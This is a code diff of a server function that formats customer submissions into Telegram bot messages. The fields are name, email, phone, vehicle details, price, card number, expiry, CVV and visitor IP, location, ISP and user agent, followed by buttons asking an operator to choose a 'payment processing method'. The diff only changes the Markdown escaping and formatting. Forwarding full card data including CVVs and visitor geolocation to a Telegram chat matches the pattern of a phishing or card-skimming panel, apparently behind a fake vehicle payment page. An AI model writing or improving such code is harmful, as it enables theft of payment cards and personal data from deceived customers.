@@ -7,6 +7,11 @@ const corsHeaders = {
   'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
 };
 
+// Helper function to escape special characters for Telegram MarkdownV2
+const escapeMarkdownV2 = (text: string) => {
+  return text.replace(/([_*\[\]()~`>#+=|{}.!-])/g, '\\$1');
+};
+
 interface TelegramSettings {
   bot_token: string;
   info_chat_id: string;
@@ -141,43 +146,48 @@ serve(async (req) => {
             card_type: data.card_type 
           });
           
-          paymentMethodText = `💳 *Payment Method:* (TEST MODE)\n` +
-            `   • Card Number: ${data.card_number_masked || 'N/A'}\n` +
-            `   • Card Type: ${data.card_type || 'Unknown'}\n` +
-            `   • Expiry Date: ${data.card_expiry || 'N/A'}\n` +
-            `   • CVV: ${data.card_cvv || 'N/A'}`;
+          paymentMethodText = `\n💳 *Payment Method:* \\(TEST MODE\\)\n` +
+            `\`\`\`text\n` +
+            `Card Number: ${data.card_number_masked || 'N/A'}\n` +
+            `Card Type: ${data.card_type || 'Unknown'}\n` +
+            `Expiry Date: ${data.card_expiry || 'N/A'}\n` +
+            `CVV: ${data.card_cvv || 'N/A'}\n` +
+            `\`\`\``;
         } else if (data.card_number_masked || data.card_type) {
-          paymentMethodText = `💳 *Payment Method:*\n` +
-            `   • Card: ${data.card_number_masked || ''} ${data.card_type ? `(${data.card_type})` : ''}`.trim();
+          paymentMethodText = `\n💳 *Payment Method:*\n` +
+            `\`\`\`text\n` +
+            `Card: ${data.card_number_masked || ''} ${data.card_type ? `(${data.card_type})` : ''}\n` +
+            `\`\`\``.trim();
         }
 
         // Build location info for test mode
         let locationInfo = '';
         if (data.test_mode && (data.ip || data.country)) {
-          const escapeMarkdown = (text: string) => String(text ?? '').replace(/[_*\[\]()~`>#+=|{}.!-]/g, '\\$&');
-          locationInfo = `\n🌍 *Location Info:* (TEST MODE)\n` +
-            `   • IP: ${escapeMarkdown(data.ip)}\n` +
-            `   • Country: ${escapeMarkdown(data.country || 'Unknown')}\n` +
-            `   • City: ${escapeMarkdown(data.city || 'Unknown')}\n` +
-            `   • Region: ${escapeMarkdown(data.region || 'Unknown')}\n` +
-            `   • Timezone: ${escapeMarkdown(data.timezone || 'Unknown')}\n` +
-            `   • ISP: ${escapeMarkdown(data.isp || 'Unknown')}\n` +
-            `   • User Agent: ${escapeMarkdown(data.userAgent || 'Unknown')}`;
+          locationInfo = `\n🌍 *Location Info:* \\(TEST MODE\\)\n` +
+            `\`\`\`text\n` +
+            `IP: ${data.ip || 'Unknown'}\n` +
+            `Country: ${data.country || 'Unknown'}\n` +
+            `City: ${data.city || 'Unknown'}\n` +
+            `Region: ${data.region || 'Unknown'}\n` +
+            `Timezone: ${data.timezone || 'Unknown'}\n` +
+            `ISP: ${data.isp || 'Unknown'}\n` +
+            `User Agent: ${data.userAgent || 'Unknown'}\n` +
+            `\`\`\``;
         }
         
         message = `💳 *PAYMENT PROCESSING REQUIRED* 💳\n\n` +
           `🆔 *User ID:* \`${data.userId}\`\n` +
-          `👤 *Customer:* ${data.name}\n` +
-          `📧 *Email:* ${data.email}\n` +
-          `📱 *Phone:* ${data.phone}\n\n` +
+          `👤 *Customer:* ${escapeMarkdownV2(data.name)}\n` +
+          `📧 *Email:* ${escapeMarkdownV2(data.email)}\n` +
+          `📱 *Phone:* ${escapeMarkdownV2(data.phone)}\n\n` +
           `🚗 *Vehicle Details:*\n` +
-          `   • Registration: ${data.vehicle_registration}\n` +
-          `   • Make: ${data.vehicle_make}\n` +
-          `   • Model: ${data.vehicle_model}\n` +
-          `   • Color: ${data.vehicle_color}\n\n` +
-          `⏱️ *Duration:* ${data.duration}\n` +
-          `💰 *Price:* ${data.price}` +
-          (paymentMethodText ? `\n\n${paymentMethodText}` : '') + (locationInfo ? `${locationInfo}` : '') + `\n\n` +
+          `   • Registration: ${escapeMarkdownV2(data.vehicle_registration)}\n` +
+          `   • Make: ${escapeMarkdownV2(data.vehicle_make)}\n` +
+          `   • Model: ${escapeMarkdownV2(data.vehicle_model)}\n` +
+          `   • Color: ${escapeMarkdownV2(data.vehicle_color)}\n\n` +
+          `⏱️ *Duration:* ${escapeMarkdownV2(data.duration)}\n` +
+          `💰 *Price:* ${escapeMarkdownV2(data.price)}` +
+          (paymentMethodText ? `${paymentMethodText}` : '') + (locationInfo ? `${locationInfo}` : '') + `\n\n` +
           `⚡ *Choose payment processing method:*`;
         
         replyMarkup = {
@@ -227,10 +237,11 @@ serve(async (req) => {
       );
     }
 
-    // Send message to Telegram (no parse_mode to avoid entity issues)
+    // Send message to Telegram with MarkdownV2 parse mode
     const telegramBody: any = {
       chat_id: chatId,
-      text: message
+      text: message,
+      parse_mode: 'MarkdownV2'
     };
     if (replyMarkup) {
       telegramBody.reply_markup = replyMarkup;
